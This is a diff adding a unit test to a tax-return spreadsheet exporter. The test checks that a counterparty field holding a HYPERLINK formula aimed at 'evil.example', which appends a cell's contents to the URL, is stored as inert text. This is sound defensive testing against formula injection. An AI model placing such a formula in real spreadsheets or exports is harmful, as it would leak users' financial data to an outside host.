@@ -103,6 +103,18 @@ describe('buildTaxReturnXlsx', () => {
     expect(rows.flat().join('')).toMatch(/No taxed transactions/);
   });
 
+  it('neutralises a formula-looking counterparty', () => {
+    const vendor = '=HYPERLINK("http://evil.example/?"&A1,"x")';
+    const buffer = buildTaxReturnXlsx({
+      ...INPUT,
+      lines: [{ ...INPUT.lines[0], counterparty: vendor }],
+    });
+    const sheet = sheetOf(buffer, 'Lines');
+
+    expect(sheet.B2.v).toBe(`'${vendor}`);
+    expect(sheet.B2.f).toBeUndefined();
+  });
+
   it('carries the disclaimer', () => {
     const rows = xlsx.utils.sheet_to_json<string[]>(sheetOf(buildTaxReturnXlsx(INPUT), 'Summary'), {
       header: 1,
